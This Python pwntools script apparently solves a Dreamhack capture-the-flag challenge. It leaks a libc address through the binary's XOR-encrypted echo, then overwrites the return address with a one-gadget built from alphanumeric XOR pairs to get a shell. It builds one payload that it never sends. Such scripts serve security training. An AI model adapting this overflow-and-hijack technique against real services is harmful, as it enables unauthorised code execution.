```python
from pwn import *
import string
import time

#p = process('./deploy/prob')
p = remote('host8.dreamhack.games', 8857)

ret_offset = 0x2a1ca
onegadget_list = [0x0583dc, 0x583e3, 0xef4ce, 0xef52b]
alphanum = string.ascii_letters + string.digits


payload_leak = b'A' * 280 + b'B' * 8
p.sendafter(b"> ", payload_leak + b"\n")
p.recvuntil(b"encrypted data: ")
leak_data = p.recvline()
leaked_bytes = leak_data[280:288]

current_stack_val = u64(leaked_bytes.ljust(8, b'\x00'))


real_ret = current_stack_val ^ u64(b'B'*8)
libc_base = real_ret - ret_offset
print(hex(libc_base))

p.sendafter(b"> ", payload_leak + b"\n")

def get_xor_pair(target_byte):
    for x in alphanum:
        for y in alphanum:
            if ord(x) ^ ord(y) == target_byte:
                return (x.encode(), y.encode())
    return (None, None)

target_gadget = libc_base + onegadget_list[0]

print(hex(target_gadget))

needed_xor_val = real_ret ^ target_gadget

print(hex(needed_xor_val))

k1 = (needed_xor_val) & 0xFF
k2 = (needed_xor_val >> 8) & 0xFF
k3 = (needed_xor_val >> 16) & 0xFF
k4 = (needed_xor_val >> 24) & 0xFF
k5 = (needed_xor_val >> 32) & 0xFF
k6 = (needed_xor_val >> 40) & 0xFF
k7 = (needed_xor_val >> 48) & 0xFF
k8 = (needed_xor_val >> 56) & 0xFF

c15, c16 = get_xor_pair(k1)
c13, c14 = get_xor_pair(k2)
c11, c12 = get_xor_pair(k3)
c9, c10 = get_xor_pair(k4)
c7, c8 = get_xor_pair(k5)
c5, c6 = get_xor_pair(k6)
c3, c4 = get_xor_pair(k7)
c1, c2 = get_xor_pair(k8)


padding = b'A' * 280

payload1 = padding + c15 + c13 + c11 + c9 + c7 + c5 + c3 + c1
payload2 = padding + c16 + c14 + c12 + c10 + c8 + c6 + c4 + c2

p.sendafter(b"> ", payload2 + b"\n")

p.interactive()
```
